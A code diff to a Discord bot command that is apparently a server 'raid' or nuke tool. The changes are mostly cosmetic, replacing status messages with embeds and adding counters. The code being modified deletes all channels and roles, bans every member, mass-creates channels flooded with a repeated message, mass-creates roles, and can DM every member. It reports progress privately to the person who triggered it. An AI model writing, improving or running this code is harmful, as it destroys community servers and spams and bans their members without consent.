@@ -42,19 +42,22 @@ module.exports = {
             rolesName: interaction.options.getString("roles_name"),
             rolesAmount: interaction.options.getInteger("roles_amount") || 50
         }
+        const notifyEmbed = (text, color = 0x0099FF) => { 
+            return { description: text, text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4", color: 0x0099FF}
+        }
         const permissionsEmbed = (permission) => {
-            return { description: `:warning: I don't have the \`${permission}\` permission!`, color: 0x0099ff, thumbnail: {url: `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.jpg` }, footer: { text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4"}, fields: [{name: "Server Name", value: guild.name, inline: true }, {name: "Server Owner", value: guildOwner.user.tag, inline: true }, {name: "Server Members Amount", value: guild.memberCount }, {name: "Channels Amount", value: guild.channels.cache.size, inline: true }, {name: "Roles Amount", value: guild.roles.cache.size, inline: true }], timestamp: new Date().toISOString() }
+            return { description: `:warning: I don't have the \`${permission}\` permission!`, color: 0xA70000, thumbnail: {url: `https://cdn.discordapp.com/icons/${guild.id}/${guild.iconURL()}.jpg` }, footer: { text: "Created by cami98735264 (GitHub)", icon_url: "https://avatars.githubusercontent.com/u/65141870?s=400&v=4"}, fields: [{name: "Server Name", value: guild.name, inline: true }, {name: "Server Owner", value: guildOwner.user.tag, inline: true }, {name: "Server Members Amount", value: guild.memberCount }, {name: "Channels Amount", value: guild.channels.cache.size, inline: true }, {name: "Roles Amount", value: guild.roles.cache.size, inline: true }], timestamp: new Date().toISOString() }
         }
             const deleteAllChannels = async (guild) => {
             if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_CHANNELS")], ephemeral: true });
             guild.channels.cache.forEach(channel => {
                 channel.delete();
             });
-            await interaction.user.send(":white_check_mark: Deleted all channels!")
+            await interaction.user.send({ embeds:[notifyEmbed(":white_check_mark: Deleted all channels!")]})
         }
 
         const deleteAllRoles = async (guild) => {
-            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ content: "I don't have the `MANAGE_ROLES` permission!", ephemeral: true });
+            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_ROLES")], ephemeral: true });
             // Get client's highest role position in current guild
             const clientHighestRolePosition = guild.members.me.roles.highest.position;
             guild.roles.cache.filter(role => role.position < clientHighestRolePosition).forEach(async role => {
@@ -62,71 +65,78 @@ module.exports = {
                     await role.delete({ reason: raidOptions.reason });
                 } catch (error) {
                     console.log(error)
-                    interaction.user.send(`:warning: Couldn't delete role \`${role.name}\` in \`${guild.name}\`!`);
+                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't delete role \`${role.name}\` in \`${guild.name}\`!`, 0xA70000)] });
                 }
             });
-            await interaction.user.send(":white_check_mark: Deleted all roles!")
+            await interaction.user.send({ embeds: [notifyEmbed(":white_check_mark: Deleted all roles!")] })
         }
 
         const banAll = async (guild) => {
+            let cont = 0;
             if(!guild.members.me.permissions.has(PermissionsBitField.Flags.BanMembers)) return interaction.user.send({ embeds: [permissionsEmbed("BAN_MEMBERS")], ephemeral: true });
             guild.members.cache.forEach(async member => {
                 try {
                     await member.ban({ reason: raidOptions.reason });
+                    cont++;
                 } catch (error) {
-                    interaction.user.send(`Couldn't ban \`${member.user.tag}\` in \`${guild.name}\`!`);
+                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't ban \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
                 }
             });
-            await interaction.user.send(":white_check_mark: Finished banning members!")
+            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Banned \`${cont}\` members!`)] });
         }
 
         const createChannels = async (guild) => {
-            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ content: "I don't have the `MANAGE_CHANNELS` permission!", ephemeral: true });
+            let cont = 0;
+            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_CHANNELS")], ephemeral: true });
             for (let i = 0; i < raidOptions.channelsAmount; i++) {
                 guild.channels.create({ name: raidOptions.channelsName, permissionOverwrites: [{id: guild.roles.everyone.id, deny: [PermissionFlagsBits.SendMessages]}] }).then(async channel => {
+                    cont++;
                     for(let i = 0;i < raidOptions.amount;i++) {
                         channel.send(raidOptions.message);
                         await sleep(raidOptions.delay);
                     }  
-                }).catch(err => interaction.user.send(`Couldn't create channel \`${raidOptions.channelsName}\` in \`${guild.name}\`!`));
+                }).catch(() => interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't create channel \`${raidOptions.channelsName}\` in \`${guild.name}\`!`, 0xA70000)] }));
             }
-            await interaction.user.send(":white_check_mark: Created all channels!");
+            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Created \`${cont}\` channels!`)] });
         }
         const createRoles = async (guild) => {
-            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ content: "I don't have the `MANAGE_ROLES` permission!", ephemeral: true });
+            let cont = 0;
+            if(!guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return interaction.user.send({ embeds: [permissionsEmbed("MANAGE_ROLES")], ephemeral: true });
             for (let i = 0; i < raidOptions.rolesAmount; i++) {
                 try {
                 await guild.roles.create({ name: raidOptions.rolesName, color: "Random", reason: raidOptions.reason });
+                cont++;
                 } catch (error) {
                     console.log(error)
-                    interaction.user.send(`Couldn't create role \`${raidOptions.rolesName}\` in \`${guild.name}\`!`);
+                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't create role \`${raidOptions.rolesName}\` in \`${guild.name}\`!`, 0xA70000)] });
                 }
                 await sleep(500);
             }
-            await interaction.user.send(":white_check_mark: Created all roles!");
+            await interaction.user.send({ embeds: [notifyEmbed(`:white_check_mark: Created \`${cont}\` roles!`)] });
         }
 
         const dmAll = async (guild, dmallMessage) => {
-
+            let cont = 0;
             guild.members.cache.forEach(async member => {
                 try {
                     await member.send(dmallMessage);
+                    cont++;
                 } catch (error) {
-                    interaction.user.send(`Couldn't DM \`${member.user.tag}\`!`);
+                    interaction.user.send({ embeds: [notifyEmbed(`‼ Couldn't DM \`${member.user.tag}\` in \`${guild.name}\`!`, 0xA70000)] });
                 }
                 await sleep(500);
             })
-            await interaction.user.send(":white_check_mark: Finished DMing members!");
+            await interaction.user.send( { embeds: [notifyEmbed(`:white_check_mark: Finished DMing \`${cont}\` members!`)] });
         }
         await deleteAllChannels(guild)
         createChannels(guild)
         await deleteAllRoles(guild)
         createRoles(guild)
         await sleep(500);
-        await interaction.user.send(`:warning: banAll was set to ${raidOptions.ban} and dmAll was set to ${raidOptions.dmall}!`);
+        await interaction.user.send({ embeds:[notifyEmbed(`❗ banAll was set to \`${raidOptions.ban}\` and dmAll was set to \`${raidOptions.dmall}\`!.\nStarting process!`, 0xFFFF00)] });
         if(raidOptions.dmall) {
             const filter = m => m.author.id === interaction.user.id;
-            interaction.user.send("What message would you like to DM all members of the server?").then(() => {
+            interaction.user.send({ embeds: [notifyEmbed(`❓ What **message** would you like to **DmAll** in ${guild.name}`)]}).then(() => {
                 interaction.user.dmChannel.awaitMessages({filter, max: 1, time: 60000, errors: ["time"] }).then(async collected => {
                     const dmallMessage = collected.first().content;
                     await interaction.user.send({ content: `:clock: Starting DmAll process in \`${guild.name}\``, ephemeral: true });
